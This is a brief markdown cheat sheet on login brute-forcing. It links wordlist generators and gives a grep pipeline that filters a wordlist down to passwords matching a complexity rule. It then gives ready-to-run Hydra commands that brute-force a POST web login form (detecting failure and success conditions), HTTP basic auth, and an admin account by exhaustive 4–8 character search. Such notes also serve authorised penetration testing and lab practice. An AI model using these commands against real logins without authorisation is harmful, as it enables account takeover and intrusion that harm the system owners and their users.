# Login bruteforcing
- [SecLists](https://github.com/danielmiessler/SecLists)
- [SecLists Kali page](https://www.kali.org/tools/seclists/)
- [CUPP](https://github.com/Mebus/cupp)
- [Username anarchy](https://github.com/urbanadventurer/username-anarchy)


## Rule filtering
```
grep -E '^.{6,}$' wordlist.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > wordlist-filtered.txt
```

## Hydra
- [Hydra Kali page](https://www.kali.org/tools/hydra/)

### POST web form
```bash
hydra -l admin -P passwords.txt <host> http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid"
```
```bash
hydra -l admin -P passwords.txt <host> http-post-form "/login:username=^USER^&password=^PASS^:S=302"
```

### Basic http auth
```bash
hydra -L usernames.txt -P passwords.txt <host> http-get
```

### Bruteforce without wordlist
Password range from 4 to 8 in length, all characters and numbers
```bash
hydra -l admin -x 4:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 <host> # ...
```